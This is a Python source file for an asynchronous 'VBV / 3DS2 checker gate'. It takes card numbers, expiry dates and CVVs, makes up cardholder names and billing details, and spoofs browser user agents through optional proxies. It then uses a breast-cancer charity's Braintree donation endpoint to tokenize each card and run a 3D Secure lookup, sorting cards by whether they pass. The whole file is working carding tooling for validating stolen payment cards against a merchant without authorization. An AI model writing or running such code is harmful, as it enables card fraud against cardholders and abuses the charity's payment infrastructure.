import asyncio
import aiohttp
import base64
import json
import uuid
import random

# Status classification map for Braintree 3DS
STATUS_MAP = {
    "authenticate_successful":          ("Passed ✅", "ENROLLED"),
    "successful":                       ("Passed ✅", "ENROLLED"),
    "authenticate_attempt_successful":  ("Passed ✅", "ENROLLED"),
    "challenge_required":               ("Challenge Required 🔑", "ENROLLED"),
    "authenticate_frictionless_failed": ("Rejected ❌", "ENROLLED"),
    "authenticate_rejected":            ("Rejected ❌", "NOT_ENROLLED"),
    "lookup_card_error":                ("Rejected ❌", "NOT_ENROLLED"),
    "lookup_error":                     ("Rejected ❌", "NOT_ENROLLED"),
    "authenticate_unavailable":         ("Rejected ❌", "NOT_ENROLLED"),
    "authenticate_error":               ("Rejected ❌", "NOT_ENROLLED"),
}


def _generate_session_id():
    guid = uuid.uuid4().hex
    return guid[:-6]


async def vbv_check(card_str, proxy_str=None):
    """
    VBV / 3DS2 Checker Gate using breastcancernow.org API via Braintree
    Converted to fully asynchronous Python.
    """
    try:
        parts = card_str.split('|')
        if len(parts) != 4:
            return {
                "status": "Error",
                "code": "invalid_format",
                "enrolled": "UNKNOWN",
                "response": "Invalid card format (use cc|mm|yy|cvv)"
            }
        cc, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = "20" + yy
        mm = mm.zfill(2)

        # Generate fake info
        first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Wilson', 'Anderson']
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10,999)}@gmail.com"

        ua = f"Mozilla/5.0 (Windows NT {random.randint(10, 11)}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 137)}.0.0.0 Safari/537.36"

        headers_setup = {
            'authority': 'securepay.breastcancernow.org',
            'accept': '*/*',
            'user-agent': ua,
        }

        connector = None
        if proxy_str:
            # support formats like user:pass@ip:port or ip:port
            if not proxy_str.startswith("http://") and not proxy_str.startswith("https://"):
                proxy_url = f"http://{proxy_str}"
            else:
                proxy_url = proxy_str
        else:
            proxy_url = None

        timeout = aiohttp.ClientTimeout(total=40)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # 1. Initial request to securepay.breastcancernow.org to establish session/cookies
            async with session.get("https://securepay.breastcancernow.org/", headers=headers_setup, proxy=proxy_url, ssl=False) as resp_init:
                await resp_init.text()

            # 2. Fetch Setup configuration containing client token
            async with session.get("https://securepay.breastcancernow.org/api/getSetup", headers=headers_setup, proxy=proxy_url, ssl=False) as resp_setup:
                setup_data = await resp_setup.json(content_type=None)
            
            token_str = setup_data.get("token")
            if not token_str:
                return {
                    "status": "Error",
                    "code": "token_fetch_failed",
                    "enrolled": "UNKNOWN",
                    "response": "Failed to fetch setup token"
                }

            # Decode token to get authorizationFingerprint
            padding = len(token_str) % 4
            if padding:
                token_str += '=' * (4 - padding)
            decoded_token = base64.b64decode(token_str).decode('utf-8', errors='ignore')
            token_json = json.loads(decoded_token)
            auth_fingerprint = token_json.get("authorizationFingerprint")
            
            if not auth_fingerprint:
                return {
                    "status": "Error",
                    "code": "fingerprint_missing",
                    "enrolled": "UNKNOWN",
                    "response": "Failed to extract authorization fingerprint"
                }

            # 3. Tokenize Credit Card via Braintree GraphQL API
            session_id = _generate_session_id()
            tokenize_payload = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": session_id
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mm,
                            "expirationYear": yy,
                            "cvv": cvv
                        },
                        "options": {
                            "validate": False
                        }
                    }
                },
                "operationName": "TokenizeCreditCard"
            }

            headers_graphql = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'authorization': f'Bearer {auth_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': ua
            }

            async with session.post("https://payments.braintree-api.com/graphql", json=tokenize_payload, headers=headers_graphql, proxy=proxy_url, ssl=False) as resp_graphql:
                graphql_res = await resp_graphql.json(content_type=None)

            if "errors" in graphql_res:
                err_msg = " | ".join([e.get("message", "Unknown") for e in graphql_res["errors"]])
                return {
                    "status": "Error",
                    "code": "tokenize_failed",
                    "enrolled": "UNKNOWN",
                    "response": err_msg
                }

            token_data = graphql_res.get("data", {}).get("tokenizeCreditCard", {})
            token = token_data.get("token")
            cc_bin = token_data.get("creditCard", {}).get("bin")

            if not token or not cc_bin:
                return {
                    "status": "Error",
                    "code": "tokenize_failed",
                    "enrolled": "UNKNOWN",
                    "response": "No token returned from tokenization"
                }

            # 4. Perform Three D Secure Lookup
            lookup_payload = {
                "amount": 2,
                "browserColorDepth": 24,
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": "en-US",
                "browserScreenHeight": 904,
                "browserScreenWidth": 407,
                "browserTimeZone": -330,
                "deviceChannel": "Browser",
                "additionalInfo": {
                    "billingLine1": "North",
                    "billingLine2": "163 Northgate Street",
                    "billingCity": "Great Yarmouth",
                    "billingPostalCode": "NR30 1BY",
                    "billingCountryCode": "gb",
                    "billingGivenName": first_name,
                    "billingSurname": last_name,
                    "email": email
                },
                "bin": cc_bin,
                "dfReferenceId": f"0_{uuid.uuid4()}",
                "clientMetadata": {
                    "requestedThreeDSecureVersion": "2",
                    "sdkVersion": "web/3.104.0",
                    "cardinalDeviceDataCollectionTimeElapsed": random.randint(500, 900),
                    "issuerDeviceDataCollectionTimeElapsed": random.randint(4500, 5800),
                    "issuerDeviceDataCollectionResult": True
                },
                "authorizationFingerprint": auth_fingerprint,
                "braintreeLibraryVersion": "braintree/web/3.104.0",
                "_meta": {
                    "merchantAppId": "securepay.breastcancernow.org",
                    "platform": "web",
                    "sdkVersion": "3.104.0",
                    "source": "client",
                    "integration": "custom",
                    "integrationType": "custom",
                    "sessionId": session_id
                }
            }

            headers_lookup = {
                'authority': 'api.braintreegateway.com',
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://securepay.breastcancernow.org',
                'referer': 'https://securepay.breastcancernow.org/',
                'user-agent': ua
            }

            lookup_url = f"https://api.braintreegateway.com/merchants/n47mkdj4n22qjcyq/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
            async with session.post(lookup_url, json=lookup_payload, headers=headers_lookup, proxy=proxy_url, ssl=False) as resp_lookup:
                lookup_res = await resp_lookup.json(content_type=None)

            if "error" in lookup_res:
                err_msg = lookup_res["error"].get("message", "Unknown error")
                return {
                    "status": "Error",
                    "code": "lookup_error",
                    "enrolled": "UNKNOWN",
                    "response": err_msg
                }

            payment_method = lookup_res.get("paymentMethod", {})
            three_ds_info = payment_method.get("threeDSecureInfo") or lookup_res.get("threeDSecureInfo") or {}
            
            raw_status = three_ds_info.get("status") or lookup_res.get("status")
            if not raw_status:
                return {
                    "status": "Error",
                    "code": "no_status",
                    "enrolled": "UNKNOWN",
                    "response": "Empty 3DS status in response"
                }

            raw_lower = raw_status.lower()

            # Parse enrollment
            enrolled_raw = three_ds_info.get("enrolled")
            enrolled_label = "UNKNOWN"
            if enrolled_raw == "Y":
                enrolled_label = "ENROLLED"
            elif enrolled_raw == "N":
                enrolled_label = "NOT_ENROLLED"

            # Parse status mapping
            if raw_lower in STATUS_MAP:
                status_label, default_enrolled = STATUS_MAP[raw_lower]
                if enrolled_label == "UNKNOWN":
                    enrolled_label = default_enrolled
            elif "successful" in raw_lower:
                status_label = "Passed ✅"
                enrolled_label = "ENROLLED"
            else:
                status_label = f"Unknown ({raw_status})"

            return {
                "status": status_label,
                "code": raw_status,
                "enrolled": enrolled_label,
                "last4": cc[-4:],
                "brand": token_data.get("creditCard", {}).get("brandCode", "UNKNOWN").upper(),
                "response": f"{status_label} | {enrolled_label} | {raw_status}"
            }

    except asyncio.TimeoutError:
        return {
            "status": "Error",
            "code": "timeout",
            "enrolled": "UNKNOWN",
            "response": "Connection timed out"
        }
    except Exception as e:
        return {
            "status": "Error",
            "code": "exception",
            "enrolled": "UNKNOWN",
            "response": f"Exception: {str(e)}"
        }
